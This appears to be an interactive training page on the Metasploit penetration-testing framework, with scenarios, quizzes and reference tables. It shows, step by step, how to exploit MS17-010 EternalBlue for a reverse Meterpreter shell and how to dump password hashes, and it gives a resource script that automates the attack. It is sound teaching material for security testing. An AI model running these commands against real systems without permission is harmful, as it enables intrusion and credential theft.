# Metasploit

Metasploit is an open-source penetration testing framework that provides information about security vulnerabilities and aids in penetration testing and IDS signature development.

## Overview

Metasploit is essential for:
- **Exploitation**: Execute known exploits against vulnerable systems
- **Payload Delivery**: Deploy shells, meterpreter, and custom payloads
- **Post-Exploitation**: Gather information, pivot, and maintain access
- **Vulnerability Validation**: Confirm if vulnerabilities are exploitable

### Installation

Metasploit is pre-installed on Kali Linux. For other systems:

```bash
# Ubuntu/Debian
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
./msfinstall

# Start the console
msfconsole

# Initialize the database (first time)
msfdb init
```

:::command-builder{id="metasploit-builder"}
tool_name: msfconsole
target_placeholder: "192.168.1.100"
scan_types:
  - name: "Search Module"
    flag: "search"
    desc: "Find exploits and modules"
  - name: "Use Module"
    flag: "use"
    desc: "Select a module to configure"
  - name: "Show Options"
    flag: "show options"
    desc: "Display module settings"
  - name: "Run Exploit"
    flag: "exploit"
    desc: "Execute the configured exploit"
options:
  - name: "Set RHOSTS"
    flag: "set RHOSTS"
    desc: "Set target host(s)"
  - name: "Set LHOST"
    flag: "set LHOST"
    desc: "Set local/listener host"
  - name: "Set Payload"
    flag: "set PAYLOAD"
    desc: "Choose payload type"
  - name: "Check Vuln"
    flag: "check"
    desc: "Test if target is vulnerable"
:::

## Core Concepts

### Module Types

| Type | Purpose | Example |
|------|---------|---------|
| `exploit` | Attack code for vulnerabilities | `exploit/windows/smb/ms17_010_eternalblue` |
| `auxiliary` | Scanning, fuzzing, sniffing | `auxiliary/scanner/smb/smb_version` |
| `payload` | Code to run after exploitation | `windows/meterpreter/reverse_tcp` |
| `post` | Post-exploitation modules | `post/windows/gather/hashdump` |
| `encoder` | Obfuscate payloads | `x86/shikata_ga_nai` |

### Basic Workflow

```
1. search [vulnerability]     # Find relevant modules
2. use [module]               # Select a module
3. show options               # View required settings
4. set RHOSTS [target]        # Configure target
5. set PAYLOAD [payload]      # Choose payload (if exploit)
6. check                      # Verify vulnerability (optional)
7. exploit                    # Run the attack
```

---

:::scenario{id="scenario-1" level="beginner"}
title: "Search for Exploits"
goal: "Find available modules for a specific vulnerability or service."
hint: "Use the search command with keywords. You can filter by type (exploit, auxiliary), platform (windows, linux), or CVE number."
command: "search type:exploit platform:windows smb"
expected_output: |
  msf6 > search type:exploit platform:windows smb

  Matching Modules
  ================

     #   Name                                       Rank       Description
     -   ----                                       ----       -----------
     0   exploit/windows/smb/ms08_067_netapi        great      MS08-067 Server Service
     1   exploit/windows/smb/ms17_010_eternalblue   excellent  MS17-010 EternalBlue
     2   exploit/windows/smb/ms17_010_psexec        normal     MS17-010 EternalRomance
     3   exploit/windows/smb/psexec                 manual     PsExec Pass the Hash

  Interact with a module by name or index. For example use 1
:::

:::scenario{id="scenario-2" level="beginner"}
title: "Configure and Run an Auxiliary Scanner"
goal: "Use an auxiliary module to scan for SMB versions on a network."
hint: "Auxiliary modules don't exploit - they gather information. Set RHOSTS to a range or subnet to scan multiple hosts."
command: "use auxiliary/scanner/smb/smb_version\nset RHOSTS 192.168.1.0/24\nrun"
expected_output: |
  msf6 > use auxiliary/scanner/smb/smb_version
  msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.0/24
  RHOSTS => 192.168.1.0/24
  msf6 auxiliary(scanner/smb/smb_version) > run

  [*] 192.168.1.10:445    - SMB Detected (versions:2, 3) (preferred:3)
                            (signatures:optional) (uptime:5d 2h)
                            (name:FILESERVER) (domain:CORP)
  [*] 192.168.1.50:445    - SMB Detected (versions:1, 2) (preferred:2)
                            (signatures:disabled) (uptime:12h)
                            (name:WIN7-PC) (domain:WORKGROUP)
  [*] Scanned 256 of 256 hosts (100% complete)
  [*] Auxiliary module execution completed
:::

:::scenario{id="scenario-3" level="beginner"}
title: "Check If a Target Is Vulnerable"
goal: "Verify a vulnerability exists before attempting exploitation."
hint: "Many exploit modules support the 'check' command to safely test if the target is vulnerable without actually exploiting it."
command: "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.50\ncheck"
expected_output: |
  msf6 > use exploit/windows/smb/ms17_010_eternalblue
  msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.50
  RHOSTS => 192.168.1.50
  msf6 exploit(windows/smb/ms17_010_eternalblue) > check

  [*] 192.168.1.50:445 - Using auxiliary/scanner/smb/smb_ms17_010
  [+] 192.168.1.50:445    - Host is likely VULNERABLE to MS17-010!
                            - Windows 7 Professional 7601 SP1 x64
  [*] 192.168.1.50:445 - Scanned 1 of 1 hosts (100% complete)
  [+] 192.168.1.50 - The target is vulnerable.
:::

:::scenario{id="scenario-4" level="intermediate"}
title: "Exploit a Vulnerable System"
goal: "Successfully exploit MS17-010 and get a Meterpreter shell."
hint: "After confirming vulnerability, set the payload and LHOST (your IP for reverse connection). Then run 'exploit' to attack."
command: "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.50\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.1.10\nexploit"
expected_output: |
  msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
  PAYLOAD => windows/x64/meterpreter/reverse_tcp
  msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.10
  LHOST => 192.168.1.10
  msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

  [*] Started reverse TCP handler on 192.168.1.10:4444
  [*] 192.168.1.50:445 - Connecting to target for exploitation
  [+] 192.168.1.50:445 - Connection established for exploitation
  [+] 192.168.1.50:445 - Target OS selected: Windows 7
  [*] 192.168.1.50:445 - Sending exploit packet
  [*] Sending stage (200774 bytes) to 192.168.1.50
  [*] Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.50:49158)

  meterpreter >
:::

:::scenario{id="scenario-5" level="intermediate"}
title: "Post-Exploitation with Meterpreter"
goal: "Gather information from a compromised system using Meterpreter."
hint: "Meterpreter provides powerful post-exploitation commands. Use 'help' to see all options. Common tasks include getting system info, dumping hashes, and taking screenshots."
command: "sysinfo\ngetuid\nhashdump\nscreenshot"
expected_output: |
  meterpreter > sysinfo
  Computer        : WIN7-PC
  OS              : Windows 7 (6.1 Build 7601, SP1)
  Architecture    : x64
  System Language : en_US
  Domain          : WORKGROUP
  Logged On Users : 2
  Meterpreter     : x64/windows

  meterpreter > getuid
  Server username: NT AUTHORITY\SYSTEM

  meterpreter > hashdump
  Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931:::
  Guest:501:aad3b435b51404ee:31d6cfe0d16ae931:::
  User:1000:aad3b435b51404ee:e19ccf75ee54e06b:::

  meterpreter > screenshot
  Screenshot saved to: /root/screenshot_1.jpeg
:::

## Tips & Tricks

### Useful Console Commands

```bash
# Database commands (requires msfdb)
db_status              # Check database connection
hosts                  # List discovered hosts
services               # List discovered services
vulns                  # List found vulnerabilities

# Session management
sessions -l            # List active sessions
sessions -i 1          # Interact with session 1
background             # Background current session

# Module info
info                   # Show module details
show payloads          # List compatible payloads
show targets           # List supported targets
```

### Meterpreter Essentials

```bash
# System commands
sysinfo                # System information
getuid                 # Current user
ps                     # List processes
migrate [PID]          # Move to another process

# File system
pwd                    # Print working directory
ls                     # List files
download [file]        # Download file
upload [file]          # Upload file

# Network
ipconfig               # Network configuration
portfwd                # Port forwarding
route                  # Routing table

# Privilege escalation
getsystem              # Attempt SYSTEM privileges
hashdump               # Dump password hashes
```

### Payload Types

| Payload Type | Description | Use Case |
|--------------|-------------|----------|
| `reverse_tcp` | Target connects back to you | NAT/firewall bypass |
| `bind_tcp` | You connect to target | Direct access |
| `reverse_https` | Encrypted reverse shell | Evade detection |
| `meterpreter` | Advanced shell with features | Full post-exploitation |

### Resource Scripts

Automate repetitive tasks:

```bash
# Create a resource script
echo "use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit" > attack.rc

# Run the script
msfconsole -r attack.rc
```

---

:::quiz{id="quiz-1"}
Q: What command is used to find modules in Metasploit?
- [ ] find
- [x] search
- [ ] locate
- [ ] lookup
:::

:::quiz{id="quiz-2"}
Q: What does the 'check' command do in an exploit module?
- [ ] Checks if Metasploit is up to date
- [ ] Checks your license status
- [x] Tests if the target is vulnerable without exploiting
- [ ] Checks the payload compatibility
:::

:::quiz{id="quiz-3"}
Q: Which payload type has the target connect back to the attacker?
- [ ] bind_tcp
- [x] reverse_tcp
- [ ] meterpreter
- [ ] staged
:::

## Quick Reference

| Command | Purpose |
|---------|---------|
| `msfconsole` | Start Metasploit console |
| `msfdb init` | Initialize database |
| `search [term]` | Find modules |
| `use [module]` | Select module |
| `info` | Module details |
| `show options` | View settings |
| `show payloads` | List payloads |
| `set [OPT] [val]` | Set option |
| `setg [OPT] [val]` | Set global option |
| `check` | Test vulnerability |
| `exploit` / `run` | Execute module |
| `sessions -l` | List sessions |
| `sessions -i [n]` | Use session |
| `background` | Background session |
| `exit` | Exit console |

## Common Variables

| Variable | Description | Example |
|----------|-------------|---------|
| `RHOSTS` | Target host(s) | `192.168.1.50` |
| `RPORT` | Target port | `445` |
| `LHOST` | Your IP (listener) | `192.168.1.10` |
| `LPORT` | Your port (listener) | `4444` |
| `PAYLOAD` | Payload to use | `windows/meterpreter/reverse_tcp` |
